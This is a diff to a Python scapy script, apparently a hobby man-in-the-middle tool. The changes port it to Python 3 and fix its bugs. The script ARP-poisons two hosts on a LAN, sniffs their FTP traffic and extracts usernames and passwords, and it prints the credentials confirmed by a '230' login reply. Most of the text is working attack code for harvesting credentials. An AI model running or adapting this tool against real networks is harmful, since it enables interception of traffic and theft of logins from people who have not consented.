@@ -1,6 +1,8 @@
 from scapy.all import *
 import sys
 import os
+from logging import getLogger, ERROR
+getLogger('scapy.runtime').setLevel(ERROR)
 
 print("\n\n    -------------------WELCOME TO SCAPY AS MITM---------------------")
 print("     ----------------------Ritz & TheGX 2020----------------------\n\n")
@@ -54,11 +56,12 @@ def cleanMess(victim_1ip, victim_2ip, interface):
 
 def checkLogin(packet, user, password):
     try:
-        if '230' in packet[Raw].load: #230 it's the code for a valid login 
-            print 'Valid Credentials Found... '
-            print '\t[*] ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':'
-            print '\t   [*] Username: ' + user
-            print '\t   [*] Password: ' + password + '\n'
+
+        if "230" in packet[Raw].load.decode('ascii'): #230 it's the code for a valid login 
+            print ("Valid Credentials Found... ")
+            print ("\n" + str(packet[IP].dst).strip() + " -> " + str(packet[IP].src).strip() + ":")
+            print ("Username: " + user+"\n")
+            print ("Password: " + password + "\n")
             return
         else:
             return
@@ -68,13 +71,13 @@ def checkLogin(packet, user, password):
 #maybe this function can be done via sniff filter, check that later
 def checkIfFTPPacket(packet):
 
-    if packet.haslayer(TCP) and pkt.haslayer(Raw): #haslayer returns true if said cls layer is on the packet  
-        if packet[TCP].sport==21 or packet[TCP].sport==21: #FTP connection to server is done via port 21 (not 20!!! thats for data)
-            return true
+    if packet.haslayer(TCP) and packet.haslayer(Raw): #haslayer returns true if said cls layer is on the packet  
+        if packet[TCP].sport==21 or packet[TCP].dport==21: #FTP connection to server is done via port 21 (not 20!!! thats for data)
+            return True
         else:
-            return false
+            return False
     else:
-        return false
+        return False
 
 def checkPacket(packet):
 
@@ -84,47 +87,56 @@ def checkPacket(packet):
         return #if not a FTP packet, return
     
     data=packet[Raw].load
-
-    if 'USER ' in data:
-        usersFTP.append(data.split('USER ')[1].strip())
-    elif 'PASS ' in data:
-        passwordsFTP.append(data.split('PASS ')[1].strip())
+    data=data.decode('ascii')
+    
+    if "USER " in data:
+        #print("found ftp user packet\n")
+        usersFTP.append(data.split("USER ")[1].strip())
+    elif "PASS " in data:
+        #print("found ftp pass packet\n")
+        passwordsFTP.append(data.split("PASS ")[1].strip())
     else:
+        #print("found ftp check packet\n")
         checkLogin(packet, usersFTP[-1], passwordsFTP[-1]) #checks if previously user and pass stored is a valid login
     return
 
 
-def FTPSniffer(interface):
+def FTPSniffer(interface, victim1Ip, victim2Ip):
 
     print("Starting FTP Sniffer...\n")
 
     try:
         sniff(iface=interface, prn=checkPacket, store=0) #prn specifies the function to apply to a received packet and store=0 to discard them 
-    except Exception:
+    except KeyboardInterrupt:
         print("Failed to init FTP sniffing. Cleaning MESS\n")
-        cleanMess
+        cleanMess(victim1Ip, victim2Ip,interface)
         sys.exit(1)
 
-def chooseAttack():
+    print("Stopped FTP Sniffer....\n")
+    return
+
+def chooseAttack(interface, victim1Ip, victim2Ip):
 
     print("Which type of communication you want to sniff? (and maybe do more...)\n")
 
 
     try:
-        typeOfAttack=input("Press 1 for FTP, 2 for SNMP and 3 for Telnet")
-
-        if(typeOfAttack==1):
-            FTPSniffer()
+        typeOfAttack=input("Press 1 for FTP, 2 for SNMP and 3 for Telnet\n")
+        
+        if(typeOfAttack=='1'):
+            FTPSniffer(interface, victim1Ip, victim2Ip)
 
     except KeyboardInterrupt:
         print("Stop typing random commands and gimme number\n")
-        cleanMess()
+        cleanMess(victim1Ip, victim2Ip, interface)
         sys.exit(1)
 
 
 
 def MITM():
 
+    #cleanMess("192.168.109.122", "192.168.109.147", "ens18")
+    #sys.exit(1)
     #we start by ping broadcasting our entire LAN to fill the arp table
     #so we can know the IP and MAC address of all hosts
     try:
@@ -173,7 +185,7 @@ def MITM():
 
     doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)
 
-    chooseAttack()
+    chooseAttack(interface, victim_1ip, victim_2ip)
    
     try:
         input("Type control-c to escape\n")
